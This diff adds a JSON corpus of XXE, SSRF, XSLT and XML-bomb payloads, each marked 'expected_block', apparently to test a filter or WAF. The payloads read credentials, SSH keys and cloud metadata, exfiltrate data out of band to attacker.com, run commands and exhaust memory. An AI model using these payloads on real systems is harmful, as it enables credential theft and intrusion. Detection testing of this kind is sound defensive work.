@@ -1,0 +1,716 @@
+[
+  {
+      "id": "INJ-XXE-380",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "file-read",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE - read /etc/passwd via external entity",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-381",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "file-read",
+        "sensitive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE - read /etc/shadow (password hashes)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-382",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal.server/admin\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "ssrf"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE SSRF - access internal HTTP server",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-383",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "file-read",
+        "php",
+        "encoded"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE PHP filter wrapper - base64 encoded file read",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-384",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>",
+      "tags": [
+        "xxe",
+        "external-dtd"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE - load external DTD (out-of-band exfiltration)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-385",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "file-read",
+        "windows"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE Windows - read win.ini system file",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-386",
+      "payload": "<!DOCTYPE data [<!ENTITY a0 \"dos\" ><!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;\"><!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;\">]><data>&a2;</data>",
+      "tags": [
+        "xxe",
+        "dos",
+        "billion-laughs"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE Billion Laughs - exponential entity expansion DoS",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-387",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+      "tags": [
+        "xxe",
+        "dos",
+        "entity-expansion"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE recursive entity expansion - memory exhaustion",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-388",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "rce",
+        "expect"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE expect:// protocol - remote code execution (if enabled)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-389",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SGVsbG8gV29ybGQ=\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "data-uri"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE data:// URI - inline data injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-390",
+      "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "dos"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE /dev/random read - DoS via infinite random data",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-391",
+      "payload": "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]>",
+      "tags": [
+        "xxe",
+        "parameter-entity",
+        "blind"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Blind XXE with parameter entities - out-of-band exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-392",
+      "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>",
+      "tags": [
+        "xxe",
+        "xinclude"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE via XInclude - file read without DOCTYPE",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-393",
+      "payload": "<!DOCTYPE foo [<!ENTITY % remote SYSTEM \"jar:http://attacker.com/evil.jar!/\">%remote;]>",
+      "tags": [
+        "xxe",
+        "jar-protocol",
+        "java"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE jar:// protocol - Java-specific exploitation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-394",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://169.254.169.254/latest/meta-data/\"><foo/>",
+      "tags": [
+        "xxe",
+        "ssrf",
+        "aws-metadata"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE SSRF to AWS metadata service",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-395",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "file-read",
+        "env-vars"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE read process environment variables",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-396",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-foo+AD4-test+ADw-/foo+AD4-",
+      "tags": [
+        "xxe",
+        "encoding",
+        "utf7"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE UTF-7 encoding bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-397",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "netdoc-protocol"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE netdoc:// protocol (Java) - file read",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-398",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://localhost:11211/_stats\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "ssrf",
+        "gopher"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE gopher:// protocol SSRF - memcached interaction",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-399",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
+      "tags": [
+        "xxe",
+        "file-read",
+        "recon"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE read hostname - infrastructure reconnaissance",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-400",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ssrf", "aws", "cloud"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE AWS metadata SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-401",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ssrf", "aws", "iam"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE AWS IAM credentials via SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-402",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ssrf", "gcp", "cloud"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE GCP metadata SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-403",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/metadata/instance\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ssrf", "azure", "cloud"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE Azure metadata SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-404",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "encoding", "utf16"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE with UTF-16 encoding",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-405",
+      "payload": "<!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><foo/>",
+      "tags": ["xxe", "external-dtd", "remote"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE external DTD load",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-406",
+      "payload": "<!DOCTYPE :foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><:foo>&xxe;</:foo>",
+      "tags": ["xxe", "namespace", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE namespace prefix bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-407",
+      "payload": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "proc", "env-vars"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE read process environment",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-408",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "proc", "recon"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE read process cmdline",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-409",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ssh-key", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE read SSH private key",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-410",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.aws/credentials\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "aws", "credentials"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE read AWS credentials file",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-411",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///.docker/config.json\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "docker", "credentials"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE read Docker credentials",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-412",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///app.war!/WEB-INF/web.xml\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "jar", "java"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE JAR protocol file read",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-413",
+      "payload": "<!DOCTYPE foo [<!ENTITY % a \"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>\">%a;]><foo>&xxe;</foo>",
+      "tags": ["xxe", "nested-entity"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE nested parameter entity",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-414",
+      "payload": "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" parse=\"text\" href=\"file:///etc/passwd\"/>",
+      "tags": ["xinclude", "file-read"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XInclude file read attack",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-415",
+      "payload": "<?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"http://attacker.com/evil.xsl\"?>",
+      "tags": ["xxe", "xslt", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE via XSLT stylesheet",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-416",
+      "payload": "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://attacker.com/evil.dtd\">",
+      "tags": ["xxe", "svg", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE via SVG DOCTYPE",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-417",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://input\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "php", "input"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE PHP input wrapper",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-418",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"phar://./app.phar\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "phar", "deserialization"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE PHAR deserialization",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-419",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"compress.zlib://file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "php", "compression"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE PHP zlib wrapper",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-420",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://attacker.com/\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ftp", "oob"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE FTP OOB exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-421",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"dict://localhost:11211/stat\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "dict", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE DICT protocol SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-422",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ldap://attacker.com/o=test\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "ldap", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE LDAP SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-423",
+      "payload": "<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">%local_dtd;]>",
+      "tags": ["xxe", "local-dtd", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE local DTD inclusion",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-424",
+      "payload": "<!DOCTYPE message [<!ENTITY % sp SYSTEM \"http://attacker.com/xxe.dtd\">%sp;%param1;]>",
+      "tags": ["xxe", "blind", "oob"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE blind OOB exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-425",
+      "payload": "<!DOCTYPE foo SYSTEM \"urn:publicid:IDN+example.com+DTD\"><foo/>",
+      "tags": ["xxe", "urn", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE URN scheme bypass attempt",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-426",
+      "payload": "<?xml version=\"1.0\"?><!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY b \"%a;\">",
+      "tags": ["xxe", "entity-expansion"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE entity expansion trick",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-427",
+      "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://attacker.com\" /></foo>",
+      "tags": ["xinclude", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XInclude remote SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-428",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/run/secrets/kubernetes.io/serviceaccount/token\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "kubernetes", "token"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE Kubernetes service account token",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-429",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "kubernetes", "certificate"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE Kubernetes CA certificate",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-430",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/.env\">]><foo>&xxe;</foo>",
+      "tags": ["xxe", "dotenv", "secrets"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE read .env secrets file",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-431",
+      "payload": "<!DOCTYPE data [<!ENTITY a0 \"dos\"><!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"><!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"><!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"><!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">]><data>&a4;</data>",
+      "tags": ["xxe", "dos", "billion-laughs"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Billion Laughs XML bomb",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-432",
+      "payload": "<!DOCTYPE r [<!ENTITY % pe_1 \"<!---->\"><!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\"><!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\"><!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">%pe_4;]><r/>",
+      "tags": ["xxe", "dos", "parameter-entity"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Parameter entity laugh attack variant",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-433",
+      "payload": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:copy-of select=\"document('/etc/passwd')\"/></xsl:template></xsl:stylesheet>",
+      "tags": ["xslt", "xxe", "file-read", "php"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSLT file read via document()",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-434",
+      "payload": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('passthru','ls -la')\"/></xsl:template></xsl:stylesheet>",
+      "tags": ["xslt", "rce", "php"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSLT RCE via PHP function",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-435",
+      "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\"><image xlink:href=\"expect://ls\"></image></svg>",
+      "tags": ["xxe", "svg", "expect", "rce"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE in SVG with expect wrapper",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-436",
+      "payload": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
+      "tags": ["xxe", "svg", "file-read"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE inside SVG file",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-437",
+      "payload": "<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://attacker.com/\">%dtd;]><xxx/>]]></foo></soap:Body>",
+      "tags": ["xxe", "soap", "cdata"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE inside SOAP body CDATA",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-438",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE cdl [<!ELEMENT cdl ANY><!ENTITY % asd SYSTEM \"http://attacker.com/xxe.dtd\">%asd;%c;]>",
+      "tags": ["xxe", "xlsx", "docx", "office"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE in Office documents (XLSX/DOCX workbook.xml)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-439",
+      "payload": "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>",
+      "tags": ["xxe", "xss", "cdata", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "CDATA XSS injection in XML",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-440",
+      "payload": "<xml ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>",
+      "tags": ["xxe", "xss", "datasrc", "ie"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XML DATASRC XSS (IE specific)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-441",
+      "payload": "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://attacker.com/xss.htc\"><xss:xss>XSS</xss:xss></HTML>",
+      "tags": ["xxe", "xss", "htc", "import"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XML namespace HTC import XSS",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-442",
+      "payload": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE doc [<!ELEMENT test ANY><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///C:/htdocs/wp-config.php\">]><doc><test>&xxe;</test></doc>",
+      "tags": ["xxe", "php", "wordpress", "config"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE to read WordPress config via PHP filter",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-443",
+      "payload": "<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>\">%int;",
+      "tags": ["xxe", "parameter-entity", "oob"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parameter entity OOB exfiltration trick",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-444",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE change-log [<!ENTITY systemEntity SYSTEM \"../../../boot.ini\"]><change-log><text>&systemEntity;</text></change-log>",
+      "tags": ["xxe", "traversal", "windows"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XXE with path traversal",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-445",
+      "payload": "<xml ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]></C></X></xml>",
+      "tags": ["xxe", "xss", "cdata", "split"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Split CDATA XSS bypass technique",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-446",
+      "payload": "<?xml version=\"1.0\" encoding=\"utf-16\" standalone=\"yes\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://attacker.com/</string></value></param></params></methodCall>",
+      "tags": ["xmlrpc", "pingback", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "WordPress XMLRPC pingback SSRF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-447",
+      "payload": "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",
+      "tags": ["yaml", "dos", "bomb"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "YAML billion laughs variant",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-448",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://attacker.com\">%dtd;]><features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\"/>",
+      "tags": ["xxe", "karaf", "cve-2018-11788"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Apache Karaf XXE CVE-2018-11788",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-449",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:////dev/random\">]>",
+      "tags": ["xxe", "dos", "linux"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE DoS via /dev/random read",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-XXE-450",
+      "payload": "<!DOCTYPE xxe PUBLIC \"Random Text\" \"http://attacker.com/external.dtd\">",
+      "tags": ["xxe", "public", "dtd"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XXE with PUBLIC keyword",
+      "category": "Injection"
+  }
+]
